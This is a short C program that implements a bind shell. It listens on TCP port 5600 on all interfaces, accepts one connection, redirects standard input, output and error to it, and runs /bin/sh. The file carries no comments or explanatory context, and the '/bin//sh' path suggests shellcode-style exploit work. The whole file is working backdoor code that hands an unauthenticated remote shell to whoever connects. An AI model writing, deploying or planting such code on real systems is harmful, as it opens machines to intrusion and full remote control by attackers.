#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main() {

    int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(5600),
        .sin_addr.s_addr = inet_addr("0.0.0.0")
    };
    bind(sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(sock, 0);
    int client = accept(sock, NULL, NULL);
    dup2(client, 2);
    dup2(client, 1);
    dup2(client, 0);
    execve("/bin//sh", NULL, NULL);
}